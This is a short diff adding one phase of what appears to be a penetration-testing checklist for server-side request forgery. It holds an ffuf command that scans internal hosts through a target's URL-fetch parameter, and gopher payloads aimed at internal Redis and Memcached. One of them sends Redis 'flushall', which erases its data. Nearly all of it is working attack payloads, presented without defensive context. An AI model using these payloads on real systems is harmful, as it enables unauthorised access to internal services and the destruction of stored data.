@@ -1,0 +1,8 @@
+**Phase 4: Port Scanning & Service Enumeration**
+- Automated internal port scan:
+  - `ffuf -u http://target.com/fetch?url=http://10.0.0.FUZZ:80 -w ports.txt`
+  - Identify internal services (Redis, Memcached, Jenkins, GitLab, etc.)
+- Target specific services:
+  - Redis: `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a`
+  - Memcached: `gopher://127.0.0.1:11211/_stats%0d%0a`
+  - FastCGI: PHP-FPM exploitation via SSRF
